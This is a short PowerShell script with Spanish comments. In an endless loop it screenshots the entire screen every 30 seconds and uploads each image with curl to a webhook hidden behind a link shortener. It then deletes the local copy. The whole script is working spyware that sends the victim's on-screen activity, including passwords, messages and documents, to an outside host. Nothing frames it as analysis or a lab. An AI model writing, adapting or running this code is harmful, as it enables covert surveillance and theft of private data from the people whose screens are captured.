$hookurl = "https://bit.ly/web_chupakbras"
$seconds = 30 # Intervalo entre capturas en segundos
$counter = 1 # Contador de imágenes

While ($true){ # Inicia un bucle infinito
    $Filett = "$env:temp\SC_$counter.png"
    Add-Type -AssemblyName System.Windows.Forms
    Add-type -AssemblyName System.Drawing
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
    Start-Sleep 1
    curl.exe -F "file1=@$Filett" $hookurl
    Start-Sleep 1
    Remove-Item -Path $Filett
    Start-Sleep $seconds
    $counter++ # Incrementa el contador
}
